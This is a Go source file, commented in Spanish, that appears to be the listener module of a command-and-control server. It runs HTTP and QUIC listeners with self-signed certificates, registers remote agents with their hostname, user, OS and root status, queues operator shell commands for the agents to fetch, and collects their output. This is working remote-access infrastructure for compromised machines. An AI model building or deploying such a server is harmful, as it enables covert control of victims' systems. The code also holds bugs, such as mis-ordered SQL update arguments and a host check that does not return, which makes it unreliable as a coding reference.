package models

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"database/sql"
	"encoding/pem"
	"fmt"
	"log"
	"math/big"
	"net/http"
	"os"
	"strconv"
	"strings"
	"text/template"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"github.com/quic-go/quic-go"
	"github.com/quic-go/quic-go/http3"
)

// Estructura de datos para el modelo de Listener
type Listener struct {
	UUID         string `json:"uuid"`
	Name         string `json:"name"`
	Type         string `json:"type"`
	Socket       string `json:"socket"`
	CreationDate string `json:"creation_date"`
	Online       bool   `json:"online"`
}

type commandsMap map[string]map[string][]string
type outputsMap map[string]map[string][]string

var commands = make(commandsMap)
var outputs = make(outputsMap)

//* DATABASE FUNCTIONS *//

// Crear tabla de listeners en la base de datos
func CreateListenerTable(db *sql.DB) error {

	// Crear la tabla si no existe
	_, err := db.Exec("CREATE TABLE IF NOT EXISTS listeners (uuid TEXT PRIMARY KEY, name TEXT, type TEXT, socket TEXT, CreationDate TEXT , Online INTEGER)")
	if err != nil {
		return err
	}

	return nil
}

// Crear un nuevo listener en la base de datos
func InsertListener(db *sql.DB, listener Listener) error {
	// Creando un nuevo listener
	fmt.Println("Creando un nuevo listener")
	// Insertar listener en la base de datos
	_, err := db.Exec("INSERT INTO listeners (uuid, name, type, socket, CreationDate, Online) VALUES (?, ?, ?, ?, ?, ?)", listener.UUID, listener.Name, listener.Type, listener.Socket, listener.CreationDate, listener.Online)
	if err != nil {
		return err
	}

	return nil
}

// GetListener obtiene un listener de la base de datos por su uuid
func GetListenerByUUID(db *sql.DB, uuid string) (*Listener, error) {

	row := db.QueryRow(`
		SELECT UUID, Name, Type, Socket, CreationDate, Online
		FROM listeners
		WHERE UUID = ?
	`, uuid)

	var listener Listener
	err := row.Scan(&listener.UUID, &listener.Name, &listener.Type, &listener.Socket, &listener.CreationDate, &listener.Online)
	if err != nil {
		return nil, err
	}

	return &listener, nil
}

func GetListenersUUID(db *sql.DB) ([]string, error) {

	rows, err := db.Query(`SELECT UUID FROM listeners`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var uuids []string
	for rows.Next() {
		var uuid string
		err = rows.Scan(&uuid)
		if err != nil {
			return nil, err
		}
		uuids = append(uuids, uuid)
	}

	return uuids, nil

}

// GetListeners obtiene todos los listeners de la base de datos
func GetListeners(db *sql.DB) ([]Listener, error) {

	rows, err := db.Query(`
		SELECT UUID, Name, Type, Socket, CreationDate, Online FROM listeners
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var listeners []Listener
	for rows.Next() {
		var listener Listener
		err = rows.Scan(&listener.UUID, &listener.Name, &listener.Type, &listener.Socket, &listener.CreationDate, &listener.Online)
		if err != nil {
			return nil, err
		}
		listeners = append(listeners, listener)
	}

	return listeners, nil
}

// UpdateListener actualiza un listener en la base de datos
func UpdateListener(db *sql.DB, listener Listener) error {

	// Actualizar listener en la base de datos
	_, err := db.Exec("UPDATE listeners SET name = ?, type = ?, socket = ?, CreationDate = ?, Online = ? WHERE uuid = ?", listener.Name, listener.Type, listener.Socket, listener.UUID, listener.CreationDate, listener.Online)
	if err != nil {
		return err
	}

	return nil
}

// DeleteListener elimina un listener de la base de datos
func DeleteListener(db *sql.DB, uuid string) error {

	// Eliminar listener de la base de datos
	_, err := db.Exec("DELETE FROM listeners WHERE uuid = ?", uuid)
	if err != nil {
		return err
	}

	return nil
}

// * SOCKET FUNCTIONS *//
func (l Listener) CreateListenerQUIC(db *sql.DB) error {

	go func() {

		//? Añado la ruta del listener al multiplexor por defecto
		http.HandleFunc("/"+l.UUID+"/", handlerHTTPConsole(db))

		//? Creo el nuevo multiplexor
		mux := http.NewServeMux()

		mux.HandleFunc("/"+l.UUID+"/", handlerHTTP(db))

		//? Configuración del servidor QUIC
		server := http3.Server{
			Handler:    mux,
			Addr:       l.Socket,
			QuicConfig: &quic.Config{},
		}

		var certPem []byte
		var privPem []byte

		//! Si el listener ya tiene un certificado y clave privada, los cargo
		if _, err := os.Stat("certs/" + l.UUID + "/cert.pem"); err == nil {
			//? Cargo el certificado en certPem
			certPem, err = os.ReadFile("certs/" + l.UUID + "/cert.pem")
			if err != nil {
				log.Fatal(err)
			}

			//? Cargo la clave privada en privPem
			privPem, err = os.ReadFile("certs/" + l.UUID + "/key.pem")
			if err != nil {
				log.Fatal(err)
			}

		} else { //! Si no tiene certificado y clave privada, es que es la primera vez que se crea el listener, por lo que genero un certificado y clave privada
			//* Creo los certificados
			priv, err := rsa.GenerateKey(rand.Reader, 2048)
			if err != nil {
				log.Fatal(err)
			}

			privBytes := x509.MarshalPKCS1PrivateKey(priv)
			privPem = pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: privBytes})

			fmt.Println("Clave privada: ", privPem)

			//? Creo el certificado
			template := x509.Certificate{
				SerialNumber: big.NewInt(1),
				Subject: pkix.Name{
					CommonName: "127.0.0.1",
				},
				NotBefore:             time.Now(),
				NotAfter:              time.Now().Add(365 * 24 * time.Hour), // 1 year
				KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
				ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
				BasicConstraintsValid: true,
			}

			// derBytes es el certificado en formato DER
			derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
			if err != nil {
				log.Fatal(err)
			}

			certPem = pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: derBytes})

			fmt.Println("Certificado: ", certPem)

			// Los certificados se crean en el directorio /certs con el UUID del listener
			//? Creo el directorio para los certificados
			if _, err := os.Stat("certs/" + l.UUID); os.IsNotExist(err) {
				os.MkdirAll("certs/"+l.UUID, 0755)
			}

			//? Creo el fichero con el certificado
			certFile, err := os.Create("certs/" + l.UUID + "/cert.pem")
			if err != nil {
				fmt.Println("Error creando el fichero de certificado:", err)
				return
			}

			//? Creo el fichero con la clave privada
			keyFile, err := os.Create("certs/" + l.UUID + "/key.pem")
			if err != nil {
				fmt.Println("Error creando el fichero de clave privada:", err)
				return
			}

			//? Escribo los certificados en los ficheros
			certFile.Write(certPem)
			certFile.Close()

			keyFile.Write(privPem)
			keyFile.Close()

		}

		cert, err := tls.X509KeyPair(certPem, privPem)
		if err != nil {
			fmt.Println("Error creando el par de claves X509:", err)
			return
		}

		server.TLSConfig = &tls.Config{
			Certificates: []tls.Certificate{cert},
			NextProtos:   []string{"h3-29"},
		}

		fmt.Print("Inicializando listener QUIC " + l.Name + " en la dirección: " + l.Socket + "...\n")

		//? Insertar el listener en la base de datos
		InsertListener(db, l)

		err = server.ListenAndServe()
		if err != nil {
			fmt.Println("Error al iniciar el listener:", err)
		}

	}()

	return nil
}

func (l Listener) CreateListenerHttp(db *sql.DB) error {

	go func() {

		//? Añado la ruta del listener al multiplexor por defecto
		http.HandleFunc("/"+l.UUID+"/", handlerHTTPConsole(db))

		//? Creo el nuevo multiplexor
		mux := http.NewServeMux()

		mux.HandleFunc("/"+l.UUID+"/", handlerHTTP(db))

		fmt.Print("Inicializando listener " + l.Name + " en la dirección: " + l.Socket + "...")

		//? Insertar el listener en la base de datos
		InsertListener(db, l)
		//? Creo el comando
		err := http.ListenAndServe(l.Socket, mux)
		//err := http.ListenAndServe(l.Socket, nil)
		if err != nil {
			fmt.Println("Error al iniciar el listener HTTP: " + err.Error())
		}

	}()

	return nil

}

func handlerHTTPConsole(db *sql.DB) func(w http.ResponseWriter, r *http.Request) {

	return func(w http.ResponseWriter, r *http.Request) {

		//* Get listener
		listener, err := GetListenerByUUID(db, strings.Split(r.URL.Path, "/")[1])

		if err != nil {
			fmt.Println("Error al obtener el listener: " + err.Error())
		}

		if r.Method == "GET" {

			// Obtengo el uuid del listener
			UUID := strings.Split(r.URL.Path, "/")[1]
			// Obtengo los agentes del listener
			agents, err := GetAgentsByListener(db, UUID)
			if err != nil {
				fmt.Println("Error al obtener los agentes: " + err.Error())
			}

			// Template
			tmp := template.Must(template.ParseFiles("Web/static/terminal.html"))
			err = tmp.Execute(w, struct {
				Agents []Agent
				UUID   string
				SOCKET string
			}{agents, UUID, listener.Socket})

			if err != nil {
				panic(err)
			}

		} else {
			http.NotFound(w, r)
		}

	}

}

func handlerHTTP(db *sql.DB) func(w http.ResponseWriter, r *http.Request) {

	return func(w http.ResponseWriter, r *http.Request) {

		print("Request: " + r.URL.Path + "\n")

		//? CORS
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST")

		//* Get listener
		listener, err := GetListenerByUUID(db, strings.Split(r.URL.Path, "/")[1])

		if err != nil {
			fmt.Println("Error al obtener el listener: " + err.Error())
		}

		//* Si el puerto es distinto al del listener, mostrar 404
		print("Listener socket: " + listener.Socket + " - Request host: " + r.Host + "- Request URL: " + r.URL.Path + "\n")

		if listener.Socket != r.Host {
			http.NotFound(w, r)
		}

		listener_uuid := strings.Split(r.URL.Path, "/")[1]
		agent_uuid := strings.Split(r.URL.Path, "/")[2]

		print("Listener: " + listener_uuid + " - Agente: " + agent_uuid + "\n")

		if strings.Split(r.URL.Path, "/")[3] == "terminal" {

			//! TERMINAL - VER OUTPUT EN COLA
			if r.Method == "GET" {

				// Obtengo el último output del agente
				if len(outputs[listener.UUID][agent_uuid]) > 0 {
					fmt.Fprint(w, outputs[listener.UUID][agent_uuid][0])
					// Elimino el output de la cola
					outputs[listener.UUID][agent_uuid] = outputs[listener.UUID][agent_uuid][1:]
				} else {
					fmt.Fprint(w, "NA NA")
				}

				//! TERMINAL - AÑADIR COMANDO A LA COLA
			} else if r.Method == "POST" {

				print("Añadiendo comando a la cola para el listener: " + listener.Name + "\n")

				// Obtengo el comando
				data := make([]byte, r.ContentLength)
				r.Body.Read(data)

				print("Comando: " + string(data) + " para el agente: " + agent_uuid + "\n")

				if commands[listener.UUID] == nil {
					commands[listener.UUID] = make(map[string][]string)
				}

				// Añado el comando a la cola
				commands[listener.UUID][agent_uuid] = append(commands[listener.UUID][agent_uuid], string(data))

				print("Comando añadido a la cola: " + strconv.Itoa(len(commands[listener.UUID][agent_uuid])) + " para el listener: " + listener.Name + "\n")

			} else {
				fmt.Fprint(w, "Error")
			}

		}

		if strings.Split(r.URL.Path, "/")[3] == "cmd" {
			//! CMD - VER COMANDO EN COLA
			if r.Method == "GET" {

				// Si el metodo es GET, es que el agente busca un comando
				print("Mirando los comandos en cola: " + strconv.Itoa(len(commands[listener_uuid][agent_uuid])) + " para el listener: " + listener.Name + "\n")

				if len(commands[listener.UUID][agent_uuid]) > 0 {

					fmt.Fprint(w, commands[listener.UUID][agent_uuid][0])
					//* Elimino el comando de la cola
					commands[listener.UUID][agent_uuid] = commands[listener.UUID][agent_uuid][1:]

				} else {
					fmt.Fprint(w, "NA NA")
				}
				//! CMD - AÑADIR OUTPUT A LA COLA
			} else if r.Method == "POST" {

				// Si el metodo es POST, es que el agente envía el output de un comando
				data := make([]byte, r.ContentLength)
				r.Body.Read(data)

				// Primera linea es el comando
				cmd := strings.Split(string(data), "\n")[0]
				// El resto es el output
				outputTemp := strings.Split(string(data), "\n")[1:]
				output := strings.Join(outputTemp, "\n")

				if outputs[listener.UUID][agent_uuid] == nil {
					outputs[listener.UUID] = make(map[string][]string)
				}

				outputs[listener.UUID][agent_uuid] = append(outputs[listener.UUID][agent_uuid], output)

				print("Comando: " + cmd + " ejecutado en el agente: " + agent_uuid + " del listener: " + listener.Name + "\n")
				print("Output: " + output + "\n")

			} else {
				fmt.Fprint(w, "Error")
			}

		} else if strings.Split(r.URL.Path, "/")[3] == "new" {

			if r.Method == "POST" {

				// Agent UUID
				agent_uuid := strings.Split(r.URL.Path, "/")[2]

				// Miro si el agente existe en la base de datos
				agent_exists, err := AgentExists(db, agent_uuid)
				if err != nil {
					fmt.Println("Error al obtener el agente: " + err.Error())
				}

				if !agent_exists {

					// Obtengo los parámetros del agente cada línea es un parámetro
					data := make([]byte, r.ContentLength)
					r.Body.Read(data)

					// Obtengo la IP del agente
					local_ip := strings.Split(r.RemoteAddr, ":")[0]

					// Obtengo los parámetros
					split := strings.Split(string(data), "\n")

					hostname := split[0]
					username := split[1]

					os := split[2]
					architecture := split[3]

					// Los imprimo

					var is_root bool
					if split[4] == "1" {
						is_root = true
					} else {
						is_root = false
					}

					print("Hostname: " + hostname + " Username: " + username + " Architecture: " + architecture + " Local IP: " + local_ip + " Is Root: " + strconv.FormatBool(is_root) + "\n")

					// Creo el agente
					agent := Agent{
						UUID:         agent_uuid,
						ListenerUUID: listener.UUID,
						Hostname:     hostname,
						Username:     username,
						OS:           os,
						Architecture: architecture,
						LocalIP:      local_ip,
						Type:         listener.Type,
						IsRoot:       is_root,
					}

					// Inserto el agente en la base de datos
					err := InsertAgent(db, agent)
					if err != nil {
						fmt.Println("Error al insertar el agente: " + err.Error())
					}
				}

			} else {
				fmt.Fprint(w, "Error")
			}

		}

	}

}
